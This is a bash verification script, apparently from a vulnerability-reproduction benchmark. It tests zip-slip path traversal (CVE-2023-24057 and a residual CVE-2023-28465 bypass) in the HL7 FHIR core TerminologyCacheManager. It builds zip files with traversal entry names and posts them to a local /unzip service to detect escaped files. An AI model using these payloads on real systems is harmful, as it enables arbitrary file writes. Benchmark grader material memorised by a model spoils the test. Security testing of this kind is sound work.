#!/usr/bin/env bash
# PCBV2-0060 hl7-fhir-org-hl7-fhir-core (CVE-2023-24057 seed / CVE-2023-28465 residual) -- 定制 verify.sh
#
# 机制: REAL HTTP zip-slip 服务 (POST /unzip, raw application/zip body), 服务端用真实
#       org.hl7.fhir.r4b TerminologyCacheManager.unzip(is, targetDir) 解压到
#       <base>/cache/tx-cache, 响应 JSON 报告所有逃逸到提取根之外的 regular file (name+content)。
#   seed    : entries=[["x/",""], ["x/../../../pwned/escaped.txt", <flag>]]
#               v0(5.6.90, 无 normalize) -> 中部 ".." 逃逸 -> 响应回显 flag   rc=0
#               v1(5.6.92, normalize+String.startsWith) -> 阻断              rc=10
#   residual: entries=[["../tx-cache-esc/escaped.txt", <flag>]]  (sibling 前缀逃逸)
#               v1(5.6.92, 字符串前缀不终止符) -> 逃逸 -> 回显 flag           rc=0
#               v2(5.6.106, Path.startsWith 组件比较) -> 阻断                rc=10
# flag 通道: HTTP 响应体 escaped_files 的 content (flag 只随上传 zip 内容流动, 服务器不持有 flag)。
# 判定基准: RUN_FLAG (提交值)。payload 嵌入 RUN_FLAG_REF (回退 RUN_FLAG):
#           正常 seed 时 RUN_FLAG=真 flag -> 逃逸回显真 flag -> 命中 -> 0;
#           wrong/stale 检查时 RUN_FLAG=override 而 RUN_FLAG_REF=真 flag ->
#           通道含真 flag != override -> 判定失败 -> 10。
# 退出码: 0=效果发生 10=未发生 20=环境失败 30=参数错误
set -uo pipefail
JUDGE_FLAG="${RUN_FLAG_REF:-$RUN_FLAG}"

: "${RUN_ID:?}" "${COMPOSE_PROJECT_NAME:?}" "${RUN_FLAG:?}" "${VERSION:?}" "${WORK_DIR:?}"
MODE="${1:-}"
[[ "$MODE" == "--seed" || "$MODE" == "--residual" ]] || { echo "usage: --seed|--residual" >&2; exit 30; }

CASE_DIR="$(cd "$(dirname "$0")/.." && pwd)"
PY="${PCB_PYTHON:-python3}"
FLAG_REF="${RUN_FLAG_REF:-$RUN_FLAG}"   # 嵌入 payload 用真 flag (回退 RUN_FLAG)
mkdir -p "$WORK_DIR"

# 动态解析 host 端口 (compose 固定映射或平台动态端口都适用)
HOSTPORT="$(CPORT="$(grep -A4 '^service:' "$CASE_DIR/case.yaml" | grep -oE 'exposed_ports: \[[0-9, ]*\]' | grep -oE '[0-9]+' | head -1)"
CPORT="${CPORT:-8080}"
docker compose -p "$COMPOSE_PROJECT_NAME" --project-directory "$CASE_DIR" port "$VERSION" "$CPORT" 2>/dev/null | head -n1)"
PORT="${HOSTPORT##*:}"
[[ -n "${PORT:-}" ]] || { echo "port resolve failed for $VERSION" >&2; exit 20; }

if [[ "$MODE" == "--seed" ]]; then
  ENTRIES_JSON="$("$PY" -c 'import json,sys; print(json.dumps([["x/",""],["x/../../../pwned/escaped.txt",sys.argv[1]]]))' "$FLAG_REF")"
else
  ENTRIES_JSON="$("$PY" -c 'import json,sys; print(json.dumps([["../tx-cache-esc/escaped.txt",sys.argv[1]]]))' "$FLAG_REF")"
fi

"$PY" - "$PORT" "$ENTRIES_JSON" "$RUN_FLAG" <<'PYEOF'
import io, json, sys, zipfile, urllib.request

port, entries, run_flag = sys.argv[1], json.loads(sys.argv[2]), sys.argv[3]

buf = io.BytesIO()
with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
    for name, content in entries:
        z.writestr(name, content)

try:
    req = urllib.request.Request(
        "http://127.0.0.1:%s/unzip" % port, data=buf.getvalue(), method="POST",
        headers={"Content-Type": "application/zip"})
    with urllib.request.urlopen(req, timeout=90) as r:
        raw = r.read().decode("utf-8", "replace")
except Exception as e:
    print("HTTP-ERROR: %r" % (e,))
    sys.exit(20)

try:
    d = json.loads(raw)
except Exception:
    print("BAD-JSON:", raw[:200])
    sys.exit(20)

print("unzip_status:", d.get("unzip_status"))
for e in (d.get("escaped_files") or []):
    print("  escaped:", str(e)[:160])

# 判定: 效果通道(响应体) 中出现提交值 RUN_FLAG 即效果发生 (flag 只可能来自逃逸文件的 content)
sys.exit(0 if run_flag in raw else 10)
PYEOF
exit $?
